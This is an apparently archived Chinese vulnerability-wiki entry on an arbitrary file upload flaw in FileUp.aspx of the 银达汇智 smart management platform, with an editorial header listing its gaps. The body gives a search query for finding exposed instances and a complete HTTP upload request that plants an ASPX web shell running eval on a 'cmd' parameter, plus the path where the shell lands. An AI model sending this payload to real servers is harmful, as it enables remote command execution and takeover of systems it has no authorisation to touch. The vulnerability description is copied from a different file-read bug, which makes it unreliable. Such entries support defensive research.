---
source: "Threekiii/Vulnerability-Wiki"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "银达汇智-智慧综合管理平台-FileUp.aspx-任意文件上传漏洞"
product: "银达汇智智慧综合管理平台"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "缺版本修复及认证前提"
side_effects: "请求写ASPX且eval命令执行是有副作用验证，需清理并补上传响应和执行判据"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-FileUp.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
version_unverified: "银达汇智 智慧综合管理平台"
id: "vw-92eb82470c05dea6adda778c"
entity_id: "ve-92eb82470c05dea6adda778c"
schema_version: "1"
---

# 银达汇智-智慧综合管理平台-FileUp.aspx-任意文件上传漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：银达汇智智慧综合管理平台
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：缺版本修复及认证前提
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 标题FileUp上传而描述FileDownLoad任意读，明显复制另一漏洞
2. version只产品名
3. 登陆页面/如图文字但图片缺失
4. 请求写ASPX且eval命令执行是有副作用验证，需清理并补上传响应和执行判据
5. cmd是参数名非密码
6. 缺版本修复及认证前提

### 操作风险

请求写ASPX且eval命令执行是有副作用验证，需清理并补上传响应和执行判据

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

## 漏洞描述

银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件

## 漏洞影响

```
银达汇智 智慧综合管理平台
```

## 网络测绘

```
"汇智信息" && title=="智慧综合管理平台登入"
```

## 漏洞复现

登陆页面


文件上传请求包

```
POST /Module/FileUpPage/FileUp.aspx?orgid=1&type=NNewsContent HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 337
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9

--62907949903a4c499178971c9dab4ad9
Content-Disposition: form-data; name="Filedata"; filename="abc.aspx"
Content-Type: image/jpeg

<%@ Page Language="Jscript"%><%Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("abc", "MD5").ToLower());eval(Request.Item["cmd"],"unsafe");%>
--62907949903a4c499178971c9dab4ad9--
```


响应包会返回文件名，上传的目录为

```
/imgnews/imgcontent/1/xxxxxxxxxx.aspx
```


出现如图成功上传木马，密码为 `cmd`


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
